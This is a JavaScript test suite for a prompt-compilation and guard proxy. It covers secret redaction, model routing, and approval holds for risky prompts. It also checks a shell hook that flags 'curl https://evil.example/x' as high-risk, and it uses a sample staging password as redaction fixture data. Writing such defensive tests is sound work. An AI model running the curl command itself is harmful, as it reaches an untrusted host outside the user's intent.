import assert from "node:assert/strict";
import test from "node:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { compilePrompt } from "../src/compile.js";
import { hookDecision } from "../src/guard.js";
import { appendLedger } from "../src/ledger.js";
import { loadHmacKey, signReceipt, verifyReceipt } from "../src/receipt.js";
import { assessRisk, createPendingStore } from "../src/risk.js";
import { pickModel } from "../src/route.js";
import { toSharp } from "../src/sharp.js";
import { approveRequest, proxyChatCompletion } from "../src/server.js";

const PROMPT_A = `Case 184392 is stuck after the Oracle order sync. The customer is Northline Civil. The order is 521184. Assets are still missing on the account, and their project manager is on site waiting. Should we wait for the next batch, or open a defect?

From Maya Iyer, 10:14: I retried the sync. The batch finished with no error on the order, but the asset list on the account is still empty. The customer called and said the equipment is not on the account.

From Maya Iyer, 10:14: I retried the sync. The batch finished with no error on the order, but the asset list on the account is still empty. The customer called and said the equipment is not on the account.

From Luis Ortega, 10:41: I checked the case feed. No entitlement row was created. The agent already tried refresh and sign out. Please tell us the next safe step for order 521184. The customer has called twice.

From Luis Ortega, 10:41: I checked the case feed. No entitlement row was created. The agent already tried refresh and sign out. Please tell us the next safe step for order 521184. The customer has called twice.

From Maya Iyer, 11:05: Pasting the last update again so you have it. Batch finished. No error. Assets still empty. Customer still waiting on the 3 pm call.

From Maya Iyer, 11:05: Pasting the last update again so you have it. Batch finished. No error. Assets still empty. Customer still waiting on the 3 pm call.

Case 184392 is stuck after the Oracle order sync. The customer is Northline Civil. The order is 521184. Assets are still missing on the account. Reply with the next step only.`;

const PROMPT_B = "Case 184392 owner is Maya Iyer, employee EMP-1842, maya.iyer@trimble.com. She reset the staging login and pasted it in chat: password=Staging-reset-04. Which queue should this case move to after the transfer?";

const PROMPT_C = "Re-push order 521184 to production and enable the entitlement for Northline Civil.";

test("Prompt A keeps case and order and shortens", () => {
  const compiled = compilePrompt(PROMPT_A);
  assert.equal(compiled.workItem, "CASE-184392");
  assert.ok(compiled.kept.some((item) => item.kind === "ORDER" && item.value === "521184"));
  assert.equal(compiled.shortened, true);
  assert.ok(compiled.afterChars < compiled.beforeChars);
  assert.equal(compiled.text.includes("184392"), true);
  assert.equal(compiled.text.includes("521184"), true);
});

test("Prompt B hides secrets and keeps case", () => {
  const compiled = compilePrompt(PROMPT_B);
  assert.equal(compiled.workItem, "CASE-184392");
  assert.ok(compiled.hidden.includes("EMAIL"));
  assert.ok(compiled.hidden.includes("EMP_ID"));
  assert.ok(compiled.hidden.includes("PASSWORD"));
  assert.equal(compiled.text.includes("maya.iyer@trimble.com"), false);
  assert.equal(compiled.text.includes("Staging-reset-04"), false);
  assert.equal(compiled.text.includes("EMP-1842"), false);
});

test("auto route picks small or large, and carbon threshold diverts to small", () => {
  const small = pickModel("What is the next step for Case 184392?");
  assert.equal(small.tier, "small");
  const large = pickModel("Implement the billing migration and write the code.");
  assert.equal(large.tier, "large");
  const diverted = pickModel("Implement the billing migration and write the code.", {}, { sessionCarbonKg: 0.05, budgetKg: 0.05 });
  assert.equal(diverted.tier, "small");
  assert.equal(diverted.diverted, true);
});

test("high-risk prompt is held then approved", async () => {
  let called = false;
  const held = await proxyChatCompletion({
    body: { messages: [{ role: "user", content: PROMPT_C }], sessionId: "risk-1" },
    apiKey: "sk-test",
    env: {},
    fetchImpl: async () => {
      called = true;
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Should not run yet." } }] }) };
    },
  });
  assert.equal(held.body.needsApproval, true);
  assert.ok(held.body.approvalId);
  assert.equal(called, false);
  assert.match(held.body.choices[0].message.content, /approval/i);

  const approved = await approveRequest({
    approvalId: held.body.approvalId,
    env: {},
    fetchImpl: async (_url, options) => {
      called = true;
      assert.equal(JSON.parse(options.body).messages.at(-1).content.includes("521184"), true);
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Approved path ran for order 521184." } }] }) };
    },
  });
  assert.equal(called, true);
  assert.equal(approved.body.meta.approvedBy, "human");
  assert.match(approved.body.choices[0].message.content, /521184/);
});

test("hook asks on high-risk shell and allows a normal prompt", () => {
  const ask = hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" });
  assert.equal(ask.permission, "ask");
  const allow = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" });
  assert.equal(allow.continue, true);
  assert.equal(allow.permission, "allow");
});

test("sharp pass strips filler and keeps case id", () => {
  const out = toSharp("Sure! I'd be happy to help. Please just really check Case 184392 next.");
  assert.equal(out.toLowerCase().includes("sure"), false);
  assert.match(out, /184392/);
});

test("receipt signs and verifies", () => {
  const dir = mkdtempSync(join(tmpdir(), "tmb-receipt-"));
  try {
    const key = loadHmacKey(dir);
    const signed = signReceipt({ receiptId: "1", workItem: "CASE-1", hidden: ["EMAIL"] }, key);
    assert.equal(verifyReceipt(signed, key), true);
    appendLedger(dir, { workItem: "CASE-1", tokens: 10, model: "gpt-4o-mini", tier: "small" });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("assessRisk flags Prompt C", () => {
  const risk = assessRisk(PROMPT_C);
  assert.equal(risk.high, true);
  assert.ok(risk.reasons.includes("republish"));
});

test("pending store expires missing ids", () => {
  const dir = mkdtempSync(join(tmpdir(), "tmb-pending-"));
  try {
    const store = createPendingStore(dir);
    assert.equal(store.take("missing"), null);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
